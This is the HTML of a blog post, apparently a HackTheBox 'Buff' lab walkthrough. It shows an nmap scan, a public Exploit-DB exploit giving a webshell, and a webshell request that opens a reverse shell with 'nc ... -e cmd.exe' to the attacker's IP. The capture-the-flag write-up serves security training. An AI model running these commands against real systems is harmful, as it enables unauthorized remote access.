Buff","mainEntityOfPage":{"@type":"WebPage","@id":"https://jeevanachandra.github.io//hackthebox/2020/07/23/Buff.html"},"@type":"BlogPosting","author":{"@type":"Person","name":"Jeevan Chandra"},"url":"https://jeevanachandra.github.io//hackthebox/2020/07/23/Buff.html","image":"https://jeevanachandra.github.io//assets/img/sample/buff/buff.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="https://jeevanachandra.github.io//feed.xml" title="DC0deZer0">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<header class="site-header " role="banner">
+
+  <div class="wrapper">
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
+  DC0deZer0
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>
+
+          <div class="trigger">
+<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>
+
+
+
+
+<span class="page-link">
+
+<div id="google_translate_element" style="display: none;">
+</div>
+
+<span class="ct-language">
+  <ul class="list-unstyled ct-language-dropdown">
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="en">
+          
+          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="fr">
+          
+          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="zh-CN">
+          
+          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ja">
+          
+          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ko">
+          
+          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ru">
+          
+          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
+          
+        </a>
+      </li>
+    
+  </ul>
+</span>
+
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: '',
+    autoDisplay: false,
+    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
+  }, 'google_translate_element');
+
+  function restoreLang() {
+    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
+    if (!iframe) return;
+
+    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+    var restore_el = innerDoc.getElementsByTagName("button");
+
+    for (var i = 0; i < restore_el.length; i++) {
+      if (restore_el[i].id.indexOf("restore") >= 0) {
+        restore_el[i].click();
+        var close_el = innerDoc.getElementsByClassName("goog-close-link");
+        close_el[0].click();
+        return;
+      }
+    }
+  }
+
+  function triggerHtmlEvent(element, eventName) {
+    var event;
+    if (document.createEvent) {
+      event = document.createEvent('HTMLEvents');
+      event.initEvent(eventName, true, true);
+      element.dispatchEvent(event);
+    } else {
+      event = document.createEventObject();
+      event.eventType = eventName;
+      element.fireEvent('on' + event.eventType, event);
+    }
+  }
+
+  var googleCombo = document.querySelector("select.goog-te-combo");
+  var langSelect = document.querySelector('.ct-language');
+  langSelect.addEventListener('click', function(event) {
+    if (!event.target) {
+      return;
+    }
+
+    var selected = document.querySelector('.ct-language .ct-language-selected');
+    if (selected) {
+      selected.classList.remove('ct-language-selected');
+    }
+
+    var target = event.target;
+    while (target && target !== langSelect ) {
+      if (target.matches('.lang-select')) {
+        break;
+      }
+      target = target.parentElement;
+    }
+
+    if (target && target.matches('.lang-select')) {
+      var lang = target.getAttribute('data-lang');
+      if (googleCombo.value == lang) {
+        restoreLang();
+      } else {
+        target.parentElement.classList.add('ct-language-selected');
+        googleCombo.value = lang;
+        triggerHtmlEvent(googleCombo, 'change');
+      }
+    }
+
+    event.preventDefault();
+  });
+}
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</span>
+</div>
+        </nav>
+</div>
+  </div>
+</header>
+
+<script>
+  (function() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+
+
+
+
+
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Buff</h1>
+  <h3 class="post-subtitle">Buff is a Hackthebox active machine, so you need the Admin hash to decrypt the walkthrough!</h3>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2020-07-23T12:54:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Jul 23, 2020
+    </time>
+    
+    <img src="/assets/img/sample/buff/buff.png">
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 15 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#windows">#windows</a><a class="post-tag" href="/tags.html#cve">#cve</a><a class="post-tag" href="/tags.html#portforwarding">#portforwarding</a>
+</div></header>
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <h2 id="info">Info</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Buff</th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: right">OS</td>
+      <td>Windows</td>
+    </tr>
+    <tr>
+      <td style="text-align: right">Difficulty</td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td style="text-align: right">Points</td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <td style="text-align: right">Release</td>
+      <td>18 Jul 2020</td>
+    </tr>
+    <tr>
+      <td style="text-align: right">IP</td>
+      <td>10.10.10.198</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="lets-get-started">Let’s get started</h2>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="no">A</span> <span class="o">-</span><span class="no">T4</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> 
+<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span> <span class="mo">05</span><span class="p">:</span><span class="mi">58</span> <span class="no">EDT</span>
+<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">)</span>
+<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">999</span> <span class="n">filtered</span> <span class="n">ports</span>
+<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">43</span> <span class="p">((</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">g</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">6</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="nb">open</span><span class="o">-</span><span class="ss">proxy: </span><span class="no">Potentially</span> <span class="no">OPEN</span> <span class="n">proxy</span><span class="o">.</span>
+<span class="o">|</span><span class="n">_Methods</span> <span class="n">supported</span><span class="ss">:CONNECTION</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">43</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">g</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">6</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="n">mrb3n</span><span class="err">'</span><span class="n">s</span> <span class="no">Bro</span> <span class="no">Hut</span>
+<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="n">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="n">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
+<span class="no">Device</span> <span class="ss">type: </span><span class="n">general</span> <span class="n">purpose</span>
+<span class="no">Running</span> <span class="p">(</span><span class="no">JUST</span> <span class="no">GUESSING</span><span class="p">):</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">XP</span><span class="o">|</span><span class="mi">7</span> <span class="p">(</span><span class="mi">86</span><span class="o">%</span><span class="p">)</span>
+<span class="no">OS</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_xp</span><span class="o">::</span><span class="n">sp2</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_7</span>
+<span class="no">Aggressive</span> <span class="no">OS</span> <span class="ss">guesses: </span><span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">XP</span> <span class="no">SP2</span> <span class="p">(</span><span class="mi">86</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="p">(</span><span class="mi">85</span><span class="o">%</span><span class="p">)</span>
+<span class="no">No</span> <span class="n">exact</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span> <span class="p">(</span><span class="nb">test</span> <span class="n">conditions</span> <span class="n">non</span><span class="o">-</span><span class="n">ideal</span><span class="p">)</span><span class="o">.</span>
+<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>
+
+<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
+<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
+<span class="mi">1</span>   <span class="mf">195.99</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
+<span class="mi">2</span>   <span class="mf">196.06</span> <span class="n">ms</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">)</span>
+
+<span class="no">OS</span> <span class="n">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">57.75</span> <span class="n">seconds</span>
+</code></pre></div></div>
+<p><img src="/assets/img/sample/buff/buff1.png" alt=""></p>
+
+<h2 id="finding-the-cve-from-exploit-db">Finding the CVE from Exploit-db</h2>
+
+<p><code class="language-plaintext highlighter-rouge">https://www.exploit-db.com/exploits/48506</code></p>
+
+<h2 id="using-the-exploit">Using the Exploit</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="mi">48506</span><span class="p">.</span><span class="nf">py</span> 
+            <span class="sr">/\
+/</span><span class="n">vvvvvvvvvvvv</span> <span class="p">\</span><span class="o">--------------------------------------</span><span class="p">,</span>
+<span class="sb">`^^^^^^^^^^^^ /============BOKU====================="
+            </span><span class="se">\/</span><span class="sb">                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+(+) Usage:       python 48506.py &lt;WEBAPP_URL&gt;                                                                                                                                                                                              
+(+) Example:     python 48506.py 'https://10.0.0.3:443/gym/'  
+</span></code></pre></div></div>
+<h2 id="exploiting">Exploiting…..</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="mi">48506</span><span class="p">.</span><span class="nf">py</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">buff</span><span class="p">.</span><span class="nf">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span>                                                                                                                                                                                
+            <span class="sr">/\                                                                                                                                                                                                                             
+/</span><span class="n">vvvvvvvvvvvv</span> <span class="p">\</span><span class="o">--------------------------------------</span><span class="p">,</span>                                                                                                                                                                                     
+<span class="sb">`^^^^^^^^^^^^ /============BOKU====================="                                                                                                                                                                                      
+            </span><span class="se">\/</span><span class="sb">                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+[+] Successfully connected to webshell.                                                                                                                                                                                                    
+C:</span><span class="se">\xa</span><span class="sb">mpp</span><span class="se">\h</span><span class="sb">tdocs</span><span class="se">\g</span><span class="sb">ym</span><span class="se">\u</span><span class="sb">pload&gt;              
+</span></code></pre></div></div>
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/all                                                                                                                                                                                                    
+�PNG                                                                                                                                                                                                                                       
+▒                                                                                                                                                                                                                                          
+                                                                                                                                                                                                                                           
+USER INFORMATION
+----------------
+
+User Name  SID                                           
+========== ==============================================
+buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+</span></code></pre></div></div>
+
+<p>From here I came to see what is the username..</p>
+
+<p><code class="language-plaintext highlighter-rouge">buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001</code></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span> <span class="n">type</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
+<span class="err">�</span><span class="no">PNG</span>
+<span class="err">▒</span>
+<span class="mi">5345</span><span class="n">fe517be93e1b736b12b0267654c2</span>
+
+</code></pre></div></div>
+
+<p>Now let’s visit the <code class="language-plaintext highlighter-rouge">http://buff.htb:8080/upload.php</code> too see anything intresting?</p>
+
+<p><img src="/assets/img/sample/buff/buff2.png" alt=""></p>
+
+<p>From the image we can see that the shell I got is not that great.. So I moved to gain the shell from the uploaded payload from the URL.</p>
+
+<p><img src="/assets/img/sample/buff/buff3.png" alt=""></p>
+
+<p><code> http://buff.htb:8080/upload/kamehameha.php?telepathy=nc 10.10.14.51 5566 -e cmd.exe</code></p>
+
+<p><img src="/assets/img/sample/buff/buff4.png" alt="">
+<img src="/assets/img/sample/buff/buff5.png" alt=""></p>
+
+<h3 id="now-time-to-find-the-vulnerable-service">Now time to find the Vulnerable Service..</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span>\<span class="n">gym</span>\<span class="n">upload</span><span class="o">&gt;</span><span class="n">netstat</span> <span class="o">-</span><span class="n">an</span>
+<span class="n">netstat</span> <span class="o">-</span><span class="n">an</span>
+
+<span class="n">Active</span> <span class="n">Connections</span>
+
+  <span class="n">Proto</span>  <span class="n">Local</span> <span class="n">Address</span>          <span class="n">Foreign</span> <span class="n">Address</span>        <span class="n">State</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">135</span>            <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">445</span>            <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4444</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4545</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5040</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">7680</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">9999</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49664</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49665</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49666</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
